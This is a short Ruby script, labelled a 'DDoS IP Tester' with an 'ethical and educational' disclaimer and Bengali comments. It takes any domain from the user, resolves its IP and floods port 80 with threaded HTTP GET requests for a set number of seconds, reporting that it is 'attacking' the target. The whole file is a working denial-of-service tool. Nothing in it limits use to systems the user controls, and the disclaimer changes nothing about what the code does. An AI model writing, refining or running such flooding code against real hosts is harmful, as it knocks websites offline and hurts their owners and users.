require 'socket'
require 'net/http'
require 'thread'
require 'uri'
require 'resolv'

# 🅰️ কাস্টম ব্যানার
puts <<~BANNER
  🔱 DDoS IP Tester by MD Abdullah 🔱
  ===================================
  💻 Ethical & Educational Purposes Only
BANNER

# 🌐 ইউজার ইনপুট
print "🌍 Target Website (e.g., example.com): "
domain = gets.strip

# ✅ IP বের করা
begin
  ip = Resolv.getaddress(domain)
rescue
  puts "❌ Invalid domain or no internet."
  exit
end

puts "🔍 Resolved IP: #{ip}"

print "🔁 Threads to use: "
threads = gets.strip.to_i

print "⏱️ Duration in seconds: "
duration = gets.strip.to_i

start_time = Time.now

# ✅ রিকুয়েস্ট ফাংশন
def flood_ip(ip)
  socket = TCPSocket.new(ip, 80)
  socket.write("GET / HTTP/1.1\r\nHost: #{ip}\r\n\r\n")
  socket.close
rescue
  nil
end

# ✅ আক্রমণ শুরু
puts "\n🚀 Attacking IP #{ip} with #{threads} threads for #{duration} seconds...\n\n"

begin
  while Time.now - start_time < duration
    thread_pool = []
    threads.times do
      thread_pool << Thread.new { flood_ip(ip) }
    end
    thread_pool.each(&:join)
  end
rescue Interrupt
  puts "\n🛑 Attack aborted by user."
end

puts "\n✅ Attack finished ethically."
